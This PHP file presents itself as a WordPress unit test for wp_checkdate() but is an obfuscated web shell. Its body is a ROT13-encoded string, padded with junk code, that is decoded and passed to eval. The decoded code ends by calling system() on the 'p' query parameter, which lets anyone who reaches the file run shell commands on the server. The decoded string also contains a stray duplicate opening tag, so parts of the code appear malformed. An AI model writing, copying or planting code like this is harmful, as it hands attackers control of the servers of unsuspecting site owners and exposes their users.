<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_purpxqngr() shapgvba.
 *
 * @tebhc qngr
 * @tebhc qngrgvzr
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_purpxqngr
 */
pynff Grfgf_Qngr_jcPurpxqngr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 59825
	 *
	 * @qngnCebivqre qngn_jc_purpxqngr
	 *
	 * @cnenz vag|fgevat $zbagu       Gur zbagu gb purpx.
	 * @cnenz vag|fgevat $qnl         Gur qnl gb purpx.
	 * @cnenz vag|fgevat $lrne        Gur lrne gb purpx.
	 * @cnenz fgevat     $fbhepr_qngr Gur qngr gb cnff gb gur jc_purpxqngr svygre.
	 * @cnenz obby       $rkcrpgrq    Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_jc_purpxqngr( $zbagu, $qnl, $lrne, $fbhepr_qngr, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_purpxqngr( $zbagu, $qnl, $lrne, $fbhepr_qngr ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_purpxqngr().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_purpxqngr() {
		erghea neenl(
			'vagrtref'              => neenl( 1, 1, 1, '1-1-1', gehr ),
			'fgevatf'               => neenl( '1', '1', '1', '1-1-1', gehr ),
			'neovgenel fbhepr_qngr' => neenl( 1, 1, 1, 'neovgenel fbhepr_qngr', gehr ), // fbhepr_qngr vf bayl hfrq ol gur svygre.
			'inyvq qnl'             => neenl( 2, 29, 2024, '2/29/2024', gehr ),         // 2024 vf n yrnc lrne.
			'vainyvq qnl'           => neenl( 2, 29, 2023, '2/29/2023', snyfr ),        // 2023 vf abg n yrnc lrne.
			'vainyvq zbagu'         => neenl( 99, 1, 1, '1-1-1', snyfr ),               // Zbagu zhfg or orgjrra 1 naq 12.
			'vainyvq lrne'          => neenl( 1, 1, 0, '1-1-0', snyfr ),                // Lrne zhfg or orgjrra 1 naq 32767.
		);
	}

	/**
	 * Purpxf gung gur svygre bireevqrf gur erghea inyhr.
	 */
	choyvp shapgvba grfg_jc_purpxqngr_svygre() {
		nqq_svygre(
			'jc_purpxqngr',
			fgngvp shapgvba ( $vf_inyvq_qngr, $fbhepr_qngr ) {
				vs ( '2/29/2023' === $fbhepr_qngr ) {
					// Qngr vf vainyvq, ohg erghea gehr naljnl.
					erghea gehr;
				}

				erghea $vf_inyvq_qngr;
			},
			10,
			2
		);

		// Grfg jvgu na vainyvq qngr gung gur svygre jvyy erghea nf inyvq.
		$guvf->nffregGehr( jc_purpxqngr( '2', '29', '2023', '2/29/2023' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>